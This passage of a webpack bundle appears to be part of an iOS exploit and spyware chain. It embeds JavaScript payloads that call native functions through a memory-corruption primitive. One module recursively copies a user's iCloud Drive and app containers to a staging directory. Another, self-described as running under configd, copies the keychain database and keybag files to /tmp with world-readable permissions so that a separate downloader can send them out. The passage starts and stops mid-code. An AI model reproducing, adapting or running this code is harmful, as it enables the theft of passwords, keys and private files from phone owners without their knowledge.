144);\n\t\t\tif (!statBuf || statBuf === 0n) continue;\n\t\t\t\n\t\t\ttry {\n\t\t\t\tconst ret = Native.callSymbol(\"stat\", fullPath, statBuf);\n\t\t\t\tif (ret !== 0) continue;\n\t\t\t\t\n\t\t\t\tconst statData = Native.read(statBuf, 144);\n\t\t\t\tconst statView = new DataView(statData);\n\t\t\t\tconst mode = statView.getUint16(4, true);\n\t\t\t\t\n\t\t\t\tconst isDir = (mode & 0xF000) === 0x4000;\n\t\t\t\tconst isFile = (mode & 0xF000) === 0x8000;\n\t\t\t\t\n\t\t\t\tif (isFile) {\n\t\t\t\t\tconst size = Number(statView.getBigUint64(96, true));\n\t\t\t\t\tfiles.push({ path: fullPath, size: size });\n\t\t\t\t} else if (isDir) {\n\t\t\t\t\tconst subFiles = listFilesRecursive(fullPath, maxDepth, currentDepth + 1);\n\t\t\t\t\tfor (const f of subFiles) {\n\t\t\t\t\t\tfiles.push(f);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"free\", statBuf);\n\t\t\t}\n\t\t}\n\t} finally {\n\t\tNative.callSymbol(\"closedir\", dir);\n\t}\n\t\n\treturn files;\n}\n\n/**\n * Copy a file from src to dst with specified permissions\n */\nfunction copyFile(srcPath, dstPath, mode) {\n\ttry {\n\t\tif (!fileExists(srcPath)) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tconst fileSize = getFileSize(srcPath);\n\t\tif (fileSize < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tif (fileSize === 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tif (fileSize > MAX_FILE_SIZE) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tconst srcFd = Native.callSymbol(\"open\", srcPath, 0);\n\t\tif (Number(srcFd) < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\tconst dstFd = Native.callSymbol(\"open\", dstPath, 0x601, mode);\n\t\t\tif (Number(dstFd) < 0) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\tconst chunkSize = 64 * 1024;\n\t\t\t\tlet totalCopied = 0;\n\t\t\t\t\n\t\t\t\twhile (totalCopied < fileSize) {\n\t\t\t\t\tconst remaining = fileSize - totalCopied;\n\t\t\t\t\tconst toRead = remaining > chunkSize ? chunkSize : remaining;\n\t\t\t\t\t\n\t\t\t\t\tconst buf = Native.callSymbol(\"malloc\", BigInt(toRead));\n\t\t\t\t\tif (!buf || buf === 0n) break;\n\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconst bytesRead = Native.callSymbol(\"read\", srcFd, buf, toRead);\n\t\t\t\t\t\tif (Number(bytesRead) <= 0) break;\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst bytesWritten = Native.callSymbol(\"write\", dstFd, buf, Number(bytesRead));\n\t\t\t\t\t\tif (Number(bytesWritten) <= 0) break;\n\t\t\t\t\t\t\n\t\t\t\t\t\ttotalCopied += Number(bytesWritten);\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tNative.callSymbol(\"free\", buf);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tNative.callSymbol(\"chmod\", dstPath, mode);\n\t\t\t\t\n\t\t\t\treturn totalCopied > 0;\n\t\t\t\t\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"close\", dstFd);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"close\", srcFd);\n\t\t}\n\t\t\n\t} catch (e) {\n\t\treturn false;\n\t}\n}\n\n/**\n * Create directory if it doesn't exist\n */\nfunction ensureDirectoryExists(dirPath) {\n\tconst statBuf = Native.callSymbol(\"malloc\", 144);\n\tif (!statBuf || statBuf === 0n) return false;\n\t\n\ttry {\n\t\tconst statResult = Native.callSymbol(\"stat\", dirPath, statBuf);\n\t\tif (statResult === 0) {\n\t\t\treturn true;\n\t\t}\n\t\t\n\t\tNative.callSymbol(\"mkdir\", dirPath, 511);\n\t\tconst mkdirResult = Native.callSymbol(\"stat\", dirPath, statBuf);\n\t\treturn mkdirResult === 0;\n\t} finally {\n\t\tNative.callSymbol(\"free\", statBuf);\n\t}\n}\n\n\n/**\n * Download iCloud Drive files\n */\nfunction getiCloudDriveFiles() {\n\tconst icloudFiles = [];\n\tconst icloudBasePath = \"/private/var/mobile/Library/Mobile Documents\";\n\t\n\t// Check if iCloud Drive is accessible\n\tif (!fileExists(icloudBasePath)) {\n\t\treturn icloudFiles;\n\t}\n\t\n\t// Main iCloud Drive folder\n\tconst icloudDrivePath = icloudBasePath + \"/com~apple~CloudDocs\";\n\t\n\tif (fileExists(icloudDrivePath)) {\n\t\tconst files = listFilesRecursive(icloudDrivePath, 10, 0);\n\t\t\n\t\tfor (const file of files) {\n\t\t\tif (file.size > MAX_FILE_SIZE) continue;\n\t\t\tif (file.size === 0) continue;\n\t\t\t\n\t\t\tconst relativePath = file.path.substring(icloudDrivePath.length + 1);\n\t\t\tconst uniqueName = \"CloudDocs_\" + relativePath.replace(/\\//g, '_');\n\t\t\t\n\t\t\ticloudFiles.push({\n\t\t\t\tpath: file.path,\n\t\t\t\tfilename: uniqueName,\n\t\t\t\tcategory: \"icloud-drive\",\n\t\t\t\tdescription: \"iCloud Drive\"\n\t\t\t});\n\t\t}\n\t}\n\t\n\t// Scan all iCloud folders\n\tconst mobileDocsDir = Native.callSymbol(\"opendir\", icloudBasePath);\n\tif (mobileDocsDir && mobileDocsDir !== 0n) {\n\t\ttry {\n\t\t\twhile (true) {\n\t\t\t\tconst entry = Native.callSymbol(\"readdir\", mobileDocsDir);\n\t\t\t\tif (!entry || entry === 0n) break;\n\t\t\t\t\n\t\t\t\tconst name = readDirentName(entry);\n\t\t\t\tif (!name || name.length === 0 || name[0] === '.') continue;\n\t\t\t\t\n\t\t\t\tif (name === \"com~apple~CloudDocs\") continue;\n\t\t\t\t\n\t\t\t\tif (name.indexOf(\"~\") !== -1) {\n\t\t\t\t\tconst appICloudPath = icloudBasePath + \"/\" + name;\n\t\t\t\t\tconst files = listFilesRecursive(appICloudPath, 10, 0);\n\t\t\t\t\t\n\t\t\t\t\tlet category = \"icloud-app\";\n\t\t\t\t\tif (name.indexOf(\"iCloud~\") === 0) {\n\t\t\t\t\t\tcategory = \"icloud-app\";\n\t\t\t\t\t} else if (name.indexOf(\"com~apple~\") === 0) {\n\t\t\t\t\t\tcategory = \"icloud-apple\";\n\t\t\t\t\t} else {\n\t\t\t\t\t\tcategory = \"icloud-other\";\n\t\t\t\t\t}\n\t\t\t\t\t\n\t\t\t\t\tfor (const file of files) {\n\t\t\t\t\t\tif (file.size > MAX_FILE_SIZE) continue;\n\t\t\t\t\t\tif (file.size === 0) continue;\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst relativePath = file.path.substring(icloudBasePath.length + 1);\n\t\t\t\t\t\tconst parts = relativePath.split('/');\n\t\t\t\t\t\tconst containerName = parts[0] || \"\";\n\t\t\t\t\t\tconst restPath = parts.slice(1).join('_').replace(/\\//g, '_');\n\t\t\t\t\t\tconst uniqueName = containerName + \"_\" + restPath;\n\t\t\t\t\t\t\n\t\t\t\t\t\ticloudFiles.push({\n\t\t\t\t\t\t\tpath: file.path,\n\t\t\t\t\t\t\tfilename: uniqueName,\n\t\t\t\t\t\t\tcategory: category,\n\t\t\t\t\t\t\tdescription: \"iCloud - \" + name\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"closedir\", mobileDocsDir);\n\t\t}\n\t}\n\t\n\treturn icloudFiles;\n}\n\n// ============================================================================\n// Main Execution\n// ============================================================================\n\nNative.init();\n\n// Create destination directory\nif (!ensureDirectoryExists(DEST_DIR)) {\n} else {\n\tNative.callSymbol(\"chmod\", DEST_DIR, 511);\n}\n\n// Extract iCloud files\nconst icloudFiles = getiCloudDriveFiles();\n\nlet successCount = 0;\nlet failCount = 0;\nlet skipCount = 0;\n\nfor (let i = 0; i < icloudFiles.length; i++) {\n\tconst icloudFile = icloudFiles[i];\n\t\n\t// Create destination path preserving relative structure\n\tconst relativePath = icloudFile.filename || icloudFile.path.substring(icloudFile.path.lastIndexOf('/') + 1);\n\tconst dstPath = DEST_DIR + \"/\" + relativePath;\n\t\n\t// Ensure parent directory exists\n\tconst lastSlash = dstPath.lastIndexOf('/');\n\tif (lastSlash > DEST_DIR.length) {\n\t\tconst parentDir = dstPath.substring(0, lastSlash);\n\t\tensureDirectoryExists(parentDir);\n\t\tNative.callSymbol(\"chmod\", parentDir, 511);\n\t}\n\t\n\t// Copy file with 777 permissions\n\tif (copyFile(icloudFile.path, dstPath, 511)) {\n\t\tsuccessCount++;\n\t} else {\n\t\tfailCount++;\n\t}\n}\n\n\n");

/***/ }),

/***/ "../node_modules/raw-loader/dist/cjs.js!./keychain_copier.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = ("// Keychain/Keybag Copier Payload\n// Runs under configd context which has access to keychain files\n// Copies keychain/keybag files to /tmp with 777 permissions\n// The main file_downloader payload will then send them\n\nclass Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize));\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr) return false;\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr) return null;\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000) len = 0x1000;\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic read32(ptr) {\n\t\tlet buff = this.read(ptr, 4);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getInt32(0, true);\n\t}\n\t\n\tstatic write64(ptr, value) {\n\t\tconst buff = new ArrayBuffer(8);\n\t\tconst view = new DataView(buff);\n\t\tview.setBigUint64(0, value, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i]) break;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated) s8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\tif (!value) return 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) return 0n;\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') return value;\n\t\telse return BigInt(value);\n\t}\n\n\tstatic #dlsym(name) {\n\t\tif (!name) return 0n;\n\t\tlet addr = this.#dlsymCache[name];\n\t\tif (addr) return addr;\n\t\tconst RTLD_DEFAULT = 0xfffffffffffffffen;\n\t\tconst nameBytes = this.stringToBytes(name, true);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tbuff8.set(new Uint8Array(nameBytes), 0x1000);\n\t\taddr = this.#nativeCallAddr(this.#dlsymAddr, RTLD_DEFAULT, this.#baseAddr + 0x1000n);\n\t\tif (addr) this.#dlsymCache[name] = addr;\n\t\treturn addr;\n\t}\n\t\n\tstatic #nativeCallAddr(addr, x0=0n, x1=0n, x2=0n, x3=0n, x4=0n, x5=0n, x6=0n, x7=0n) {\n\t\tlet buff = new BigInt64Array(nativeCallBuff);\n\t\tbuff[0] = addr;\n\t\tbuff[100] = x0;\n\t\tbuff[101] = x1;\n\t\tbuff[102] = x2;\n\t\tbuff[103] = x3;\n\t\tbuff[104] = x4;\n\t\tbuff[105] = x5;\n\t\tbuff[106] = x6;\n\t\tbuff[107] = x7;\n\t\tinvoker();\n\t\treturn buff[200];\n\t}\n\t\n\tstatic #nativeCallSymbol(name, ...args) {\n\t\tconst funcAddr = this.#dlsym(name);\n\t\tconst ret64 = this.#nativeCallAddr(funcAddr, ...args);\n\t\tif (ret64 < 0xffffffffn && ret64 > -0xffffffffn) return Number(ret64);\n\t\treturn ret64;\n\t}\n}\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\nconst TAG = \"INFO\";\n\n// Destination directory for copied files\nconst DEST_DIR = \"/tmp\";\n\n// ============================================================================\n// Keychain and Keybag Files to Copy (iOS 18)\n// ============================================================================\n\nconst KEYCHAIN_FILES = [\n\t// Keychain database\n\t{ src: \"/private/var/Keychains/keychain-2.db\", dst: \"keychain-2.db\" },\n\t\n\t// Keybag files in /var/keybags\n\t{ src: \"/var/keybags/persona.kb\", dst: \"persona.kb\" },\n\t{ src: \"/var/keybags/usersession.kb\", dst: \"usersession.kb\" },\n\t{ src: \"/var/keybags/backup/backup_keys_cache.sqlite\", dst: \"backup_keys_cache.sqlite\" },\n\t{ src: \"/private/var/keybags/persona.kb\", dst: \"persona_private.kb\" },\n\t{ src: \"/private/var/keybags/usersession.kb\", dst: \"usersession_private.kb\" },\n\t\n\t// Keybag files in Keychains directory\n\t{ src: \"/private/var/Keychains/System.keybag\", dst: \"System.keybag\" },\n\t{ src: \"/private/var/Keychains/Backup.keybag\", dst: \"Backup.keybag\" },\n\t{ src: \"/private/var/Keychains/persona.kb\", dst: \"persona_keychains.kb\" },\n\t{ src: \"/private/var/Keychains/usersession.kb\", dst: \"usersession_keychains.kb\" },\n\t{ src: \"/private/var/Keychains/device.kb\", dst: \"device.kb\" },\n];\n\n// ============================================================================\n// Helper Functions\n// ============================================================================\n\nfunction fileExists(filePath) {\n\tconst result = Native.callSymbol(\"access\", filePath, 0);\n\treturn Number(result) === 0;\n}\n\nfunction getFileSize(filePath) {\n\ttry {\n\t\tconst statBuf = Native.callSymbol(\"malloc\", BigInt(144));\n\t\tif (!statBuf || statBuf === 0n) return -1;\n\t\t\n\t\ttry {\n\t\t\tconst statResult = Native.callSymbol(\"stat\", filePath, statBuf);\n\t\t\tif (statResult !== 0) return -1;\n\t\t\t\n\t\t\tconst statData = Native.read(statBuf, 144);\n\t\t\tconst statView = new DataView(statData);\n\t\t\treturn Number(statView.getBigUint64(0x60, true));\n\t\t} finally {\n\t\t\tNative.callSymbol(\"free\", statBuf);\n\t\t}\n\t} catch (e) {\n\t\treturn -1;\n\t}\n}\n\n/**\n * Copy a file from src to dst with specified permissions\n */\nfunction copyFile(srcPath, dstPath, mode) {\n\ttry {\n\t\t// Check if source exists\n\t\tif (!fileExists(srcPath)) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tconst fileSize = getFileSize(srcPath);\n\t\tif (fileSize < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\tif (fileSize === 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\t// Open source for reading\n\t\tconst srcFd = Native.callSymbol(\"open\", srcPath, 0); // O_RDONLY\n\t\tif (Number(srcFd) < 0) {\n\t\t\treturn false;\n\t\t}\n\t\t\n\t\ttry {\n\t\t\t// Create/open destination for writing\n\t\t\t// O_WRONLY | O_CREAT | O_TRUNC = 0x601\n\t\t\tconst dstFd = Native.callSymbol(\"open\", dstPath, 0x601, mode);\n\t\t\tif (Number(dstFd) < 0) {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t\t\n\t\t\ttry {\n\t\t\t\t// Copy in chunks\n\t\t\t\tconst chunkSize = 64 * 1024;\n\t\t\t\tlet totalCopied = 0;\n\t\t\t\t\n\t\t\t\twhile (totalCopied < fileSize) {\n\t\t\t\t\tconst remaining = fileSize - totalCopied;\n\t\t\t\t\tconst toRead = remaining > chunkSize ? chunkSize : remaining;\n\t\t\t\t\t\n\t\t\t\t\tconst buf = Native.callSymbol(\"malloc\", BigInt(toRead));\n\t\t\t\t\tif (!buf || buf === 0n) break;\n\t\t\t\t\t\n\t\t\t\t\ttry {\n\t\t\t\t\t\tconst bytesRead = Native.callSymbol(\"read\", srcFd, buf, toRead);\n\t\t\t\t\t\tif (Number(bytesRead) <= 0) break;\n\t\t\t\t\t\t\n\t\t\t\t\t\tconst bytesWritten = Native.callSymbol(\"write\", dstFd, buf, Number(bytesRead));\n\t\t\t\t\t\tif (Number(bytesWritten) <= 0) break;\n\t\t\t\t\t\t\n\t\t\t\t\t\ttotalCopied += Number(bytesWritten);\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tNative.callSymbol(\"free\", buf);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t// Set permissions to 777 (0777 = 511 decimal)\n\t\t\t\tNative.callSymbol(\"chmod\", dstPath, mode);\n\t\t\t\t\n\t\t\t\treturn totalCopied > 0;\n\t\t\t\t\n\t\t\t} finally {\n\t\t\t\tNative.callSymbol(\"close\", dstFd);\n\t\t\t}\n\t\t} finally {\n\t\t\tNative.callSymbol(\"close\", srcFd);\n\t\t}\n\t\t\n\t} catch (e) {\n\t\treturn false;\n\t}\n}\n\n// ============================================================================\n// Main Execution\n// ============================================================================\n\nNative.init();\n\n\ntry {\n\tlet successCount = 0;\n\tlet failCount = 0;\n\t\n\tfor (const file of KEYCHAIN_FILES) {\n\t\tconst srcPath = file.src;\n\t\tconst dstPath = DEST_DIR + \"/\" + file.dst;\n\t\t\n\t\t\n\t\t// Copy with 777 permissions (0777 = 511)\n\t\tif (copyFile(srcPath, dstPath, 511)) {\n\t\t\tsuccessCount++;\n\t\t} else {\n\t\t\tfailCount++;\n\t\t}\n\t}\n\t\n\t\n} catch (e) {\n}\n\n\n\n");

/***/ }),

/***/ "../node_modules/raw-loader/dist/cjs.js!./loader.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = ("class Native {\n\t\n\tstatic #baseAddr;\n\tstatic #dlsymAddr;\n\tstatic #memcpyAddr;\n\tstatic #mallocAddr;\n\tstatic #oinvAddr;\n\t\n\t// Preallocated memory chunk for general purpose stuff for public use\n\tstatic mem = 0n;\n\tstatic memSize = 0x4000;\n\t\n\t// Preallocated memory chunk for encoding/decoding of string arguments\n\tstatic #argMem = 0n;\n\tstatic #argMemPtr = 0n;\n\tstatic #argMemPtrStr = 0n;\n\t\n\t// Pointer to next available memory for native argument\n\tstatic #argPtr = 0n;\n\tstatic #argPtrPtr = 0n;\n\tstatic #argPtrStrPtr = 0n;\n\n\tstatic #dlsymCache = {};\n\t\n\tstatic init() {\n\t\tconst buff = new BigUint64Array(nativeCallBuff);\n\t\tthis.#baseAddr = buff[20];\n\t\tthis.#dlsymAddr = buff[21];\n\t\tthis.#memcpyAddr = buff[22];\n\t\tthis.#mallocAddr = buff[23];\n\t\tthis.#oinvAddr = buff[24];\n\t\t\n\t\t//log(\"baseAddr: \" + this.#baseAddr);\n\t\t//log(\"dlsymAddr: \" + this.#dlsymAddr);\n\t\t\n\t\t//this.#memcpyAddr = this.#dlsym(\"test\");\n\t\t//log(\"memcpyAddr: \" + this.#memcpyAddr);\n\t\t//log(\"oinvAddr: \" + this.#oinvAddr);\n\t\t\n\t\tthis.mem = this.#nativeCallAddr(this.#mallocAddr, BigInt(this.memSize)); //this.callSymbol(\"malloc\", this.memSize);\n\t\tthis.#argMem = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argMemPtr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argMemPtrStr = this.#nativeCallAddr(this.#mallocAddr, 0x1000n); //this.callSymbol(\"malloc\", 0x1000);\n\t\tthis.#argPtr = this.#argMem;\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\t\n\t\t//log(\"argMem: \" + this.#argMem);\n\t\t//log(\"argMemPtr: \" + this.#argMemPtr);\n\t\t//log(\"argMemPtrStr: \" + this.#argMemPtrStr);\n\t}\n\t\n\tstatic write(ptr, buff) {\n\t\tif (!ptr)\n\t\t\treturn false;\n\t\t//log(\"write: \" + buff.byteLength);\n\t\tlet buff8 = new Uint8Array(nativeCallBuff);\n\t\tlet offs = 0;\n\t\tlet left = buff.byteLength;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t//log(`writing: ptr=${ptr}, src=${Native.#baseAddr + 0x1000n}, offs=${offs}, len=${len}`);\n\t\t\tbuff8.set(new Uint8Array(buff, offs, len), 0x1000);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, ptr + BigInt(offs), this.#baseAddr + 0x1000n, BigInt(len));\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn true;\n\t}\n\t\n\tstatic read(ptr, length) {\n\t\tif (!ptr)\n\t\t\treturn null;\n\t\t//log(`read: ptr=${ptr}, length=${length}, ${typeof(length)}`, ptr, length);\n\t\tlet buff = new ArrayBuffer(length);\n\t\tlet buff8 = new Uint8Array(buff);\n\t\tlet offs = 0;\n\t\tlet left = length;\n\t\twhile (left) {\n\t\t\tlet len = left;\n\t\t\tif (len > 0x1000)\n\t\t\t\tlen = 0x1000;\n\t\t\t//log(`reading: ptr=${ptr}, dst=${Native.#baseAddr + 0x1000n}, offs=${offs}, len=${len}`);\n\t\t\tthis.#nativeCallAddr(this.#memcpyAddr, this.#baseAddr + 0x1000n, ptr + BigInt(offs), BigInt(len));\n\t\t\tbuff8.set(new Uint8Array(nativeCallBuff, 0x1000, len), offs);\n\t\t\tleft -= len;\n\t\t\toffs += len;\n\t\t}\n\t\treturn buff;\n\t}\n\t\n\tstatic readPtr(ptr) {\n\t\tlet buff = this.read(ptr, 8);\n\t\tconst view = new DataView(buff);\n\t\treturn view.getBigUint64(0, true);\n\t}\n\t\n\tstatic readString(ptr, len=1024) {\n\t\tlet buff = this.read(ptr, len);\n\t\treturn this.bytesToString(buff, false);\n\t}\n\t\n\tstatic writeString(ptr, str) {\n\t\tconst buff = this.stringToBytes(str, true);\n\t\tthis.write(ptr, buff);\n\t}\n\t\n\tstatic callSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"callSymbol: \" + name);\n\t\t// Initialize argPtr to point to general purpose memory chunk\n\t\tthis.#argPtr = this.#argMem;\n\t\tx0 = this.#toNative(x0);\n\t\tx1 = this.#toNative(x1);\n\t\tx2 = this.#toNative(x2);\n\t\tx3 = this.#toNative(x3);\n\t\tx4 = this.#toNative(x4);\n\t\tx5 = this.#toNative(x5);\n\t\tx6 = this.#toNative(x6);\n\t\tx7 = this.#toNative(x7);\n\t\tlet ret = this.#nativeCallSymbol(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtr\n\t\tthis.#argPtr = this.#argMem;\n\t\treturn ret;\n\t}\n\t\n\tstatic callSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7) {\n\t\t//log(\"callSymbolRetain: \" + name);\n\t\t// Initialize argPtrPtr to point to general purpose memory chunk\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\tx0 = this.#toNativePtr(x0);\n\t\tx1 = this.#toNativePtr(x1);\n\t\tx2 = this.#toNativePtr(x2);\n\t\tx3 = this.#toNativePtr(x3);\n\t\tx4 = this.#toNativePtr(x4);\n\t\tx5 = this.#toNativePtr(x5);\n\t\tx6 = this.#toNativePtr(x6);\n\t\tx7 = this.#toNativePtr(x7);\n\t\tlet ret = this.#nativeCallSymbolRetain(name, x0, x1, x2, x3, x4, x5, x6, x7);\n\t\t// Reset argPtrPtr\n\t\tthis.#argPtrPtr = this.#argMemPtr;\n\t\tthis.#argPtrStrPtr = this.#argMemPtrStr;\n\t\treturn ret;\n\t}\n\n\tstatic bytesToString(bytes, includeNullChar=true) {\n\t\tlet bytes8 = new Uint8Array(bytes);\n\t\tlet str = \"\";\n\t\tfor (let i=0; i<bytes8.length; i++) {\n\t\t\tif (!includeNullChar && !bytes8[i])\n\t\t\t\tbreak;\n\t\t\tstr += String.fromCharCode(bytes8[i]);\n\t\t}\n\t\treturn str;\n\t}\n\t\n\tstatic stringToBytes(str, nullTerminated=false) {\n\t\tlet buff = new ArrayBuffer(str.length + (nullTerminated ? 1 : 0));\n\t\tlet s8 = new Uint8Array(buff);\n\t\tfor (let i=0; i<str.length; i++)\n\t\t\ts8[i] = str.charCodeAt(i);\n\t\tif (nullTerminated)\n\t\t\ts8[str.length] = 0x0;\n\t\treturn s8.buffer;\n\t}\n\t\n\tstatic #toNative(value) {\n\t\t//log(\"toNative: \" + typeof value);\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNative(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet ptr = this.#argPtr;\n\t\t\tthis.writeString(ptr, value);\n\t\t\tthis.#argPtr += BigInt(value.length + 1);\n\t\t\treturn ptr;\n\t\t}\n\t\telse if (typeof value === 'bigint') {\n\t\t\treturn value;\n\t\t}\n\t\telse\n\t\t\treturn BigInt(value);\n\t}\n\t\n\tstatic #toNativePtr(value) {\n\t\t//log(\"toNativePtr: \" + typeof value);\n\t\t// Strings need to be manually written to native memory\n\t\tif (!value)\n\t\t\treturn 0n;\n\t\tlet ptr = this.#argPtrPtr;\n\t\tif (typeof value === 'string') {\n\t\t\tif (value.length >= 0x1000) {\n\t\t\t\tlog('toNativePtr(): arg string is too long');\n\t\t\t\treturn 0n;\n\t\t\t}\n\t\t\tlet strPtr = this.#argPtrStrPtr;\n\t\t\tthis.writeString(strPtr, value);\n\t\t\tthis.#argPtrStrPtr += BigInt(value.length + 1);\n\t\t\tvalue = strPtr;\n\t\t}\n\t\telse if (typeof value !== 'bigint') {\n\t\t\tvalue = 